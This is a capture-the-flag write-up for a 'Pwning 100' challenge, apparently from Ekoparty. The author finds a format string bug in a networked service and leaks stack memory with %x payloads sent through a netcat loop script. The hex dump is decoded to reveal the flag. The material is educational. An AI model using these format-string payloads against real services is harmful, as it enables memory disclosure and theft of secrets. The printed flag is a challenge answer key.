# My first service I - Pwning 100

```
Blacky is taking his first steps at C programming for embedded systems, but he makes some mistakes. Retrieve the secret key for access.

nc 9a958a70ea8697789e52027dc12d7fe98cad7833.ctf.site 35000
Alternate server: 7e0a98bb084ec0937553472e7aafcf68ff96baf4.ctf.site 35000 
```

Basically, this one asks you for a "secret key" over the network.
I hate to say it, but this one's almost exactly the same as [Chile](https://ctftime.org/writeup/4374) from H4ck1t this year. We netcat to `9a958a70ea8697789e52027dc12d7fe98cad7833.ctf.site:35000`, ostensibly to enter a "secret key", but it's pretty clear from messing around that the server is vulnerable to a format string bug (we aren't given a binary):

``
$ nc 9a958a70ea8697789e52027dc12d7fe98cad7833.ctf.site 35000
Welcome to my first service
Please input the secret key: %x
Invalid key: 0

Please input the secret key: %s  
Invalid key: (null)

Please input the secret key: ^C
```

Lets dump memory, 32 bits at a time:

```
$ cat getflag 
#!/bin/sh

for i in $(seq 0 54)
do
	payload=$(perl -e "print '%x' x $i . '%08x'")
	echo "$payload" | nc 9a958a70ea8697789e52027dc12d7fe98cad7833.ctf.site 35000 | head -n 2 | tail -n 1 | tail -c 9
done

```

Each payload looks like `%x%x%x%08x` or similar. We don't care about what's output by each `%x`; the last few commands in the pipeline throw away everything but the output of the `%08x`. We then get a memory dump, 4 bytes at a time:

```
$ ./getflag | tee log
00000000
0000000a
00000000
00000000
00000000
0000000a
00000000
454b4f7b
4c614269
67426566
3072647d
00000000
25782578
25782578
25782578
25782578
25782578
25782578
25782578
25782578
25782578
25782578
25782578
25782530
25303878
38780a00
0a000000
00000000
00000000
00000000
00000000
00000000
00000000
00000000
00000000
00000000
00000000
00000000
00000000
00000000
00000000
00000000
00000000
00000000
00000000
496e7661
6c696420
6b65793a
20257825
78257825
78257825
78257825
78257825
78257825
78257825
```

It's actually not a 100% faithful dump; each output is from a different run of the program and all the `7825`'s are actually `%x`'es which have clobbered whatever used to be there.

```
$ cat log | hex2bin


EKO{LaBigBef0rd}%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%0%08x8x

Invalid key: %x%x%x%x%x%x%x%x%x%x%x%x%x%
```

Good enough, I guess. 
